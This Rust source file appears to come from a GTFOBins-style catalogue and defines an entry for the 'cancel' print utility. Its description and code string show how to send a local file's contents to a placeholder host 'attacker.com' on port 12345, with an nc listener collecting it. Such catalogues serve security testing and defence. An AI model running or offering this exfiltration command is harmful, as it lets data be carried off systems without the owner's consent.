
pub static BIN_NAME: &'static str = "cancel";
pub static FU_DESC: &'static str = "Send local file using a TCP connection. Run `nc -l -p 12345 > 'file_to_save'` on the attacker box to collect the file.";
pub static FU_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_send
    cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT
"#;
use crate::code::{Code, Tag};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
